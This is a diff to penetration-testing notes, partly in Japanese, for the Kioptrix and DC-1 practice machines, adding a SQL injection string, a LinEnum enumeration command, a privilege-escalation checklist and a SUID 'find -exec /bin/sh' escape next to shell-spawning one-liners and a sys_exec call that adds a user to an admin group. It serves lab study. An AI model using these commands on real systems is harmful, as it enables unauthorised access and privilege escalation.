@@ -1,4 +1,4 @@
-🐻 Kioptrix#1/#2/#3/#4
+🐻 Kioptrix#1/#2/#3/#4 DC-1
 
 ## Reconnaissance
 
@@ -47,6 +47,18 @@ Samba
 
 [SQL Injection Cheat Sheet](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
 
+    ' or 1=1--
+
+[LinEnum](https://github.com/rebootuser/LinEnum)
+
+    ./LinEnum.sh -r repo -e /tmp/.le
+
+ 1. どのようなユーザが存在するか？
+ 2. 権限昇格を狙えるものはあるか？
+ 3. SUID／SGID(実行ファイル所有者権限実行)が存在しないか？
+ 4. 自ユーザで書き込める・アクセスできるものは何か？
+
+
 
 ## Delivery
 
@@ -60,10 +72,11 @@ http転送
 
 Spawning A TTY Shell
 
-    echo os.system('/bin/bash') #LShell
+    echo os.system('/bin/bash')  #LShell
     /bin/sh -i
-    python -c 'import pty; pty.spawn("/bin/sh")'
+    python -c 'import pty; pty.spawn("/bin/bash")'
     ruby -e 'exec "/bin/bash"'
+    find /etc/passwd -exec /bin/sh \;  #SUID
 
 
 [bashリバースシェル](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
@@ -93,10 +106,6 @@ sqlmap
     select * from func;
     select sys_exec('usermod -a -G admin [user]');
 
-
-[LinEnum](https://github.com/rebootuser/LinEnum)
-
-    ./LinEnum.sh -r repo -e /tmp/.le
 
 
 
